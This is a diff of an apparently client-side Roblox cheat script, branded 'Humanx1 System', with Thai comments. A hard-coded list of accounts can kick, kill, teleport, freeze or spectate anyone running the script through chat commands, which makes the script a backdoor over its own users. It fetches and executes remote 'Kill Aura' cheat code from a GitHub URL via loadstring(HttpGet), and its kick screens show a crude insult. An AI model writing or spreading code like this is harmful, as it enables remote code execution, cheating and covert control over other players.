@@ -4,23 +4,7 @@ local Player = game.Players.LocalPlayer
 local Camera = workspace.CurrentCamera
 local MyName = Player.Name
 
--- 1. รายชื่อ Main Admin
-local MainAdmins = {
-    ["ffsww_1007"] = true,
-    ["A_ASPD"] = true
-}
-
--- 2. รายชื่อผู้มีสิทธิ์มอบ VIP, เช็ค VIP และใช้คำสั่ง View
-local AuthorizedToGive = {
-    ["ffsww_1007"] = true,
-    ["A_ASPD"] = true,
-    ["HACKER_18050"] = true,
-    ["evils915"] = true,
-    ["TV_BTS1"] = true,
-    ["Winwie001"] = true
-}
-
--- ลิสต์ตรวจสอบสถานะ VIP
+-- รายชื่อ Admin/VIP หลัก
 _G.VIP_LIST = _G.VIP_LIST or {
     ["ffsww_1007"] = true,
     ["A_ASPD"] = true,
@@ -30,25 +14,17 @@ _G.VIP_LIST = _G.VIP_LIST or {
     ["Winwie001"] = true
 }
 
-_G.CONTROL_OWNER = _G.CONTROL_OWNER or {}
-
--- ฟังก์ชันแจ้งเตือนบนหน้าจอ (Notify)
-local function ShowNotify(text, color)
-    local sg = Instance.new("ScreenGui", game.CoreGui)
-    local lb = Instance.new("TextLabel", sg)
-    lb.Size = UDim2.new(0, 400, 0, 100)
-    lb.Position = UDim2.new(0.5, -200, 0.2, 0)
-    lb.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    lb.TextColor3 = color or Color3.fromRGB(255, 255, 255)
-    lb.Text = text
-    lb.TextScaled = true
-    lb.TextWrapped = true
-    lb.BackgroundTransparency = 0.3
-    game:GetService("Debris"):AddItem(sg, 5) -- แสดงผล 5 วินาที
+-- ฟังก์ชันแจ้งเตือน (Notification)
+local function ShowNotify(text)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Humanx1 System",
+        Text = text,
+        Duration = 5
+    })
 end
 
--- ฟังก์ชันดีดออกพร้อมข้อความด่า
-local function CustomKick(isNoVip)
+-- ฟังก์ชันดีดออก (ด่า "โดนกูเตะไงไอ้ควาย" แบบเต็มจอ)
+local function CustomKick()
     local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
     ScreenGui.IgnoreGuiInset = true
     local TextLabel = Instance.new("TextLabel", ScreenGui)
@@ -56,16 +32,16 @@ local function CustomKick(isNoVip)
     TextLabel.BackgroundTransparency = 0.05
     TextLabel.Size = UDim2.new(1, 0, 1, 0)
     TextLabel.Font = Enum.Font.FredokaOne
+    TextLabel.Text = "โดนกูเตะไงไอ้ควาย" -- คำด่าเดียวกันหมดตามสั่ง 555
     TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
     TextLabel.TextScaled = true
     TextLabel.ZIndex = 999999
 
-    local msg = isNoVip and "มึงไม่มีวีไอพีไงก็เลยโดนคนอื่รเตะออกเเบบนี้ไง" or "โดนกูเตะไงไอ้ควาย"
-    TextLabel.Text = msg
-    wait(2.8)
-    Player:Kick("\n\n[ Humanx1 System ]\n" .. msg .. "\n(error555)\n\n")
+    task.wait(2.5) -- ให้มันอ่านความกวนตีนก่อนเด้ง
+    Player:Kick("\n\n[ Humanx1 System ]\nโดนกูเตะไงไอ้ควาย\n(error555)\n\n")
 end
 
+-- ฟังก์ชันค้นหาผู้เล่น
 local function findByPartialName(name)
     name = name:lower()
     for _, p in pairs(game.Players:GetPlayers()) do
@@ -78,65 +54,68 @@ end
 local function ListenChat(speaker, msg)
     local args = msg:split(" ")
     local command = args[1]:lower()
-    local targetPlayer = args[2] and findByPartialName(args[2])
     
-    -- [ A. ส่วนของ VIP และผู้มีสิทธิ์ (สั่งที่เครื่องตัวเอง) ]
-    if speaker.Name == MyName and _G.VIP_LIST[MyName] then
-        
-        -- 1. ตรวจสอบรายชื่อ VIP ทั้งหมดในเซิร์ฟ
-        if command == "!checkvip" then
-            local vips = "VIP List:\n"
-            for name, _ in pairs(_G.VIP_LIST) do
-                if game.Players:FindFirstChild(name) then
-                    vips = vips .. "- " .. name .. "\n"
+    if _G.VIP_LIST[speaker.Name] then
+        local target = args[2] and findByPartialName(args[2])
+
+        -- === คำสั่งเสริมที่เพิ่มเข้าไป ===
+        if speaker.Name == MyName then
+            if command == "!view" and target then
+                Camera.CameraSubject = target.Character:FindFirstChildOfClass("Humanoid")
+            elseif command == "!unview" then
+                Camera.CameraSubject = Player.Character:FindFirstChildOfClass("Humanoid")
+            elseif command == "!checkvip" then
+                local list = "VIPs: "
+                for name, _ in pairs(_G.VIP_LIST) do if game.Players:FindFirstChild(name) then list = list .. name .. ", " end end
+                ShowNotify(list)
+            end
+        end
+
+        -- 1. หมวดเตะ (ด่าเหมือนกันหมด)
+        if command == "!kick" and target == Player then
+            CustomKick()
+        elseif command == "!kickall" then
+            CustomKick()
+
+        -- 2. หมวดสังหาร (Reset ตัวละคร เลือด 0)
+        elseif command == "!kill" and target == Player then
+            if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
+                Player.Character:FindFirstChildOfClass("Humanoid").Health = 0
+            end
+        elseif command == "!killall" then
+            if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
+                Player.Character:FindFirstChildOfClass("Humanoid").Health = 0
+            end
+
+        -- 3. หมวด TP
+        elseif command == "!tp" and target == Player then
+            if speaker.Character and speaker.Character:FindFirstChild("HumanoidRootPart") then
+                if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
+                    Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
                 end
             end
-            ShowNotify(vips, Color3.fromRGB(0, 255, 255)) -- สีฟ้าสว่าง
-        end
 
-        -- 2. คำสั่ง View
-        if command == "!view" and targetPlayer then
-            if targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid") then
-                Camera.CameraSubject = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
+        -- 4. หมวดควบคุม
+        elseif command == "!freeze" and target == Player then
+            if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
+                Player.Character.HumanoidRootPart.Anchored = true
             end
-        elseif command == "!unview" then
+        elseif command == "!unfreeze" and target == Player then
+            if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
+                Player.Character.HumanoidRootPart.Anchored = false
+            end
+        elseif command == "!jump" and target == Player then
             if Player.Character and Player.Character:FindFirstChildOfClass("Humanoid") then
-                Camera.CameraSubject = Player.Character:FindFirstChildOfClass("Humanoid")
+                Player.Character:FindFirstChildOfClass("Humanoid").Jump = true
             end
-        end
 
-        -- 3. เช็คก่อน Give VIP (กันซ้ำ)
-        if command == "!givevip" and targetPlayer and AuthorizedToGive[MyName] then
-            if _G.VIP_LIST[targetPlayer.Name] then
-                ShowNotify("คนนี้ have vip อยู่เเล้ว", Color3.fromRGB(255, 255, 0))
-                return
-            end
-        end
-    end
-
-    -- [ B. ระบบมอบ VIP (ส่งไปเครื่องเป้าหมาย) ]
-    if AuthorizedToGive[speaker.Name] and command == "!givevip" and targetPlayer == Player then
-        if not _G.VIP_LIST[Player.Name] then
-            _G.VIP_LIST[Player.Name] = true
-            _G.CONTROL_OWNER[Player.Name] = speaker.Name
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
-        end
-    end
-
-    -- [ C. ระบบควบคุมเป้าหมาย ]
-    if targetPlayer == Player then
-        -- เตะคนไม่มี VIP
-        if command == "!kick" and MainAdmins[speaker.Name] and not _G.VIP_LIST[Player.Name] then
-            CustomKick(true)
-            return
-        end
-        -- สั่งการคนที่มี VIP (เฉพาะคนที่เป็น Owner)
-        if _G.CONTROL_OWNER[Player.Name] == speaker.Name then
-            if command == "!kill" then Player.Character:BreakJoints()
-            elseif command == "!tp" then Player.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
-            elseif command == "!freeze" then Player.Character.HumanoidRootPart.Anchored = true
-            elseif command == "!unfreeze" then Player.Character.HumanoidRootPart.Anchored = false
-            elseif command == "!kick" and MainAdmins[speaker.Name] then CustomKick(false)
+        -- 5. มอบ VIP (เช็คกันกิ๊ฟซ้ำ)
+        elseif command == "!givevip" and target == Player then
+            if _G.VIP_LIST[Player.Name] then
+                if speaker.Name == MyName then ShowNotify("คนนี้ have vip อยู่เเล้ว") end
+            else
+                _G.VIP_LIST[Player.Name] = true
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/stampx85-byte/Humanx1/refs/heads/main/Kill%20Aura%2020"))()
             end
         end
     end
